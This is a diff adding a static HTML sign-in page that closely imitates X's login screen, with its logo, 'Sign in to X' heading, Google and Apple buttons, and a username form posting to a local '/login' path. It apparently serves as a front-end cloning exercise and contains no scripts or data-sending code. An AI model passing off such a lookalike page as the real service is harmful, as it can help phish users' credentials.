@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log In</title>
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="login-container">
+    <!-- Top-left white "X" in Nunito font -->
+    <div class="top-left-icon">
+      <a href="#">X</a>
+    </div>
+
+    <!-- Main "X" logo -->
+    <div class="logo">
+      <img src="x-logo.png" alt="X Logo">
+    </div>
+    
+    <!-- Larger "Sign in to X" heading -->
+    <h1 class="left-align-heading">Sign in to X</h1>
+
+    <!-- Sign in with Google and Apple buttons -->
+    <div class="external-login">
+      <button class="google-btn">
+        <img src="google-logo.png" alt="Google Icon"> Sign in with Google
+      </button>
+      <button class="apple-btn">
+        <img src="apple-logo.png" alt="Apple Icon"> Sign in with Apple
+      </button>
+    </div>
+
+    <!-- Divider with "or" -->
+    <div class="divider">
+      <hr><span>or</span><hr>
+    </div>
+
+    <form action="/login" method="POST" class="login-form">
+      <input type="text" name="username" placeholder="Phone, email, or username" required>
+
+      <!-- Next and Forgot Password buttons with adjusted width -->
+      <div class="form-buttons">
+        <button type="button" class="next-btn">Next</button>
+        <button type="button" class="forgot-password-btn">Forgot Password?</button>
+      </div>
+    </form>
+    
+    <!-- Left-aligned footer link with extra spacing above -->
+    <div class="links left-align-links">
+      <span>Don't have an account? <a href="#">Sign up</a></span>
+    </div>
+  </div>
+</body>
+</html>
